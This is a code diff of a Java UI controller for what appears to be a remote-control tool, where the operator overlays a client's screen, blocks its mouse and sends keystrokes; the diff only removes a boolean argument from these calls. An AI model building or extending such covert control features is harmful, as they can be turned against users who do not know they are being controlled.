@@ -59,7 +59,7 @@ public class ScreenViewControls {
 
 	public static void create() throws IOException {
 		if (isCreated) {
-			Utils.showErrorMessage("Incorrect action", "Can't create new Frame", "One frame already exists.", false);
+			Utils.showErrorMessage("Incorrect action", "Can't create new Frame", "One frame already exists.");
 			return;
 		}
 		Stage screenviewstage = new Stage();
@@ -98,31 +98,31 @@ public class ScreenViewControls {
 
 	@FXML
 	private void screen_overlayAction() {
-		Misc.toggle_overlay(MainWindowControls.handler, false);
+		Misc.toggle_overlay(MainWindowControls.handler);
 	}
 
 	@FXML
 	private void screen_blockMouseAction() {
-		Misc.toggle_blockmouse(MainWindowControls.handler, false);
+		Misc.toggle_blockmouse(MainWindowControls.handler);
 	}
 
 	@FXML
 	private void screen_sendkeysAction() {
 		if (MainWindowControls.handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.", false);
+					"Select client in 'Connections' pane firstly.");
 			return;
 		}
-		Misc.presskeys(MainWindowControls.handler, screen_keyfield.getText(), false);
+		Misc.presskeys(MainWindowControls.handler, screen_keyfield.getText());
 	}
 
 	@FXML
 	private void toggleScreen() {
 		if (MainWindowControls.handler == null) {
 			Utils.showErrorMessage("Incorrect action", "You must select client first!",
-					"Select client in 'Connections' pane firstly.", false);
+					"Select client in 'Connections' pane firstly.");
 			return;
 		}
-		Misc.toggle_screen(MainWindowControls.handler, false);
+		Misc.toggle_screen(MainWindowControls.handler);
 	}
 }
